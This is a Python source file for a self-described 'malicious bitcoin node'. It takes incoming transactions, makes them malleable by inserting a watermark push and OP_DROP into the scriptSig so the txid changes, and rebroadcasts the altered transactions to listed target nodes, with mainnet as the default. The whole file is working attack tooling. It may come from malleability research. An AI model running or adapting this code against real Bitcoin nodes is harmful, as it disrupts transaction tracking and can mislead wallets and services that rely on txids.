#!/usr/bin/env python3
#
import socket
import time
import random
import struct
import hashlib
import binascii
import re
import errno
import bitcoin
import os
from datetime import datetime
import argparse

from contextlib import closing
from bitcoin.messages import MsgSerializable,  msg_inv, msg_addr, msg_alert, msg_getaddr, msg_tx, msg_version, msg_verack, msg_addr, msg_getdata, msg_ping, msg_pong
from bitcoin.net import CInv
from bitcoin.core.script import CScript, OP_DUP, OP_HASH160, OP_EQUALVERIFY,\
    OP_CHECKSIG, SignatureHash, SIGHASH_ALL
from bitcoin.core import lx, b2x, COutPoint, CMutableTxOut, CMutableTxIn, \
    CMutableTransaction, Hash160
from queue import Queue
from publisher_node import BitcoinPublisherNode
from blessings import Terminal
from threading import Thread, current_thread
from custom_log import log, ERROR, INFO, SUCCESS


class BitcoinCollectorNode:
    def __init__(self, listen_ip, listen_port, water_mark='CYBER2', debug=False, bc_local_node_ip='127.0.0.1', bc_local_node_port=0, static_addresses=[]):

        self.s = None

        self.bc_local_node_ip = bc_local_node_ip
        self.bc_local_node_port = bc_local_node_port

        self.buffer_size = 1024
        self.debug = debug

        self.local_ip = listen_ip
        self.local_port = listen_port

        self.water_mark = water_mark
        self.workers = []
        self.static_addresses = static_addresses

    def handle_message(self, s, data):
        while True:
            if(len(data) == 0):
                return data
            index = data.find(b'\n')
            if index == -1:
                return data
            msg = data[0:index].decode('utf8')
            trx = bytes.fromhex(msg)
            # dispatch malleable txs to workers so that they broadcast it to other victime nodes
            self.__publish_txs_to_workers__(trx)

            data = data[index+1:]

    def server(self):
        self.__create_workers__()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.local_ip, self.local_port))
            server.listen()
            log('Listening on %s:%s' % (self.local_ip, self.local_port), INFO)
            while True:
                conn, _ = server.accept()
                with conn:
                    left_over = bytes()
                    while True:
                        response_data = bytes()
                        # Todo check if the kill signal has been received
                        try:
                            response_data = conn.recv(self.buffer_size)
                            if(len(response_data) == 0):
                                try:
                                    conn.close()
                                except:
                                    pass
                                break

                        except socket.error as e:

                            err = e.args[0]
                            if err != errno.EAGAIN and err != errno.EWOULDBLOCK:
                                log("Network error: %s" % e, ERROR)
                                log("Closing socket...", ERROR)
                                try:
                                    conn.close()
                                except:
                                    pass
                                break
                        try:
                            response_data = left_over + response_data
                            left_over = self.handle_message(
                                conn, response_data)
                            response_data = left_over
                            time.sleep(0.1)
                        except Exception as e:
                            log(" [-] Server error: %s" % e, ERROR)
                            log(" [-] Closing socket...", ERROR)
                            try:
                                conn.close()
                            except:
                                pass
                            break
            server.shutdown(socket.SHUT_RDWR)
            server.close()

    def big_2_little_endian(self, h):
        r = bytearray(h)
        r.reverse()
        return bytes(r)

    def __mutate__(self, water_mark, cmtrx_ser):
        cmtrx = CMutableTransaction.deserialize(cmtrx_ser)
        txid_before = cmtrx.GetTxid()

        vuln_vin = -1
        for index, vin in enumerate(cmtrx.vin):
            if len(vin.scriptSig) > 0:
                vuln_vin = index
                break
        if vuln_vin == -1:
            return (cmtrx, False)
        vin0 = cmtrx.vin[vuln_vin].serialize()
        sigScriptHex = bytes.fromhex(cmtrx.vin[vuln_vin].scriptSig.hex())

        bwater_mark = len(water_mark).to_bytes(
            1, 'big') + water_mark.encode('utf-8')
        prefix = bwater_mark + b'\x75'

        newSigScriptHex = prefix + sigScriptHex
        newSigScript = CScript(newSigScriptHex)

        vinMaleable0 = CMutableTxIn.deserialize(vin0)
        vinMaleable0.scriptSig = newSigScript

        cmtrx.vin[vuln_vin] = vinMaleable0

        txid_after = cmtrx.GetTxid()
        log('Old TXID: %s' % self.big_2_little_endian(txid_before).hex(), SUCCESS)
        log('New TXID: %s' % self.big_2_little_endian(txid_after).hex(), SUCCESS)

        return (cmtrx, True)

    def __create_workers__(self):
        count = 0
        nodes_to_start = []

        for (addr_ip, addr_port) in list(self.static_addresses):
            count += 1
            # Creating worker to %s:%s" % (addr_ip, addr_port)
            pipe = Queue()
            node = BitcoinPublisherNode(addr_ip, addr_port, pipe)
            # Address consumed
            self.static_addresses.remove((addr_ip, addr_port))
            # cache worker
            self.workers.append((node, pipe))
            # Add node to list of nodes to start
            nodes_to_start.append(node)

        for node in nodes_to_start:
            node.start()

    def __publish_txs_to_workers__(self, cmtrx_ser):
        (malleable_tx, is_malleable) = self.__mutate__(
            self.water_mark, cmtrx_ser)
        if not is_malleable:
            return

        if len(self.workers) == 0:
            return
        for w in list(self.workers):
            (t, q) = w
            # clean dead threads
            if not t.is_alive():
                self.workers.remove(w)
                continue
            q.put((malleable_tx.GetTxid(), malleable_tx))


if __name__ == '__main__':
    pat_ipv4 = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

    parser = argparse.ArgumentParser(
        description="Use this script to start a malicious bitcoin node.")
    net_group = parser.add_mutually_exclusive_group()
    
    net_group.add_argument("-main", "--chain-main", default=True,
                           action="store_true", help="use the main chain\n")
    net_group.add_argument("-test", "--chain-test",
                           action="store_true", help="use the test chain\n")
    net_group.add_argument("-regtest", "--chain-regtest",
                           action="store_true", help="use the regtest chain\n")
    net_group.add_argument("-signet", "--chain-signet",
                           action="store_true", help="use the signet chain\n")

    parser.add_argument("-i", "--peer-ip", type=str,
                          help="the target bitcoin node ip address\n")
    parser.add_argument("-p", "--peer-port", type=int,
                          help="the target bitcoin node port\n")

    parser.add_argument("-iL", "--input-list", type=str,
                             help="file with target bitcoin nodes each line in form of <ip>:<port>\n")

    parser.add_argument("-li", "--listen-ip", type=str, required=True,
                        help="The local ip address on which this server will listen\n")
    parser.add_argument("-lp", "--listen-port", type=int, required=True,
                        help="The local port on which this server will listen\n")
    parser.add_argument("-w", "--water-mark", type=str, required=False,
                        default='CYBER2', help="water mark to inject into sigScript, the same word you shoud provide to block scanner default: CYBER2\n")
    parser.add_argument("-v", "--verbose", action="store_true",
                        default=False, help="toggle verbosity\n")
    args = parser.parse_args()

    peer_ip = args.peer_ip
    peer_port = args.peer_port
    input_list = args.input_list

    listen_ip = args.listen_ip
    listen_port = args.listen_port

    water_mark = args.water_mark

    if not pat_ipv4.fullmatch(listen_ip) or (peer_ip is not None and not pat_ipv4.fullmatch(peer_ip)):
        log('Please Provide a valid ip address', ERROR)
        exit(1)
    static_addresses = []
    if input_list != None:
        file = open(args.input_list)
        lines = file.readlines()
        file.close()
        for line in lines:
            line = line.strip()
            if len(line) == 0:
                continue
            if line.index(':') < 0:
                log(
                    '"%s" is not a valid entry in the file, should be <ip>:<port>' % line, ERROR)
            ip = line.split(':')[0].strip()
            port = line.split(':')[1].strip()
            if not pat_ipv4.fullmatch(ip):
                log('"%s" is not a valid ip address found in line %d' %
                    (ip, line), ERROR)
                continue
            try:
                port = int(port)
            except ValueError as e:
                log('"%s" is not a valid port address found in line %d' %
                    (port, line), ERROR)
            static_addresses.append((ip, port))
    else:
        static_addresses.append((peer_ip, peer_port))

    if args.chain_test:
        bitcoin.SelectParams("test")
    elif args.chain_regtest:
        bitcoin.SelectParams("regtest")
    elif args.chain_signet:
        bitcoin.SelectParams("signet")

    if len(static_addresses) == 0:
        log('Please Add address of at least one bitcoin node', ERROR)
        exit(1)

    log('Water mark: %s' % water_mark, INFO)
    log('Starting Server at %s:%s ...' % (listen_ip, listen_port), INFO)
    log('Bitcoin nodes to connevct to: %s nodes' %
        len(static_addresses), INFO)
    for node_addresse in static_addresses:
        log('    Bitcoin Node: %s:%s' % node_addresse, INFO)
    print()
    node = BitcoinCollectorNode(
        listen_ip, listen_port, debug=True, static_addresses=static_addresses)
    node.server()
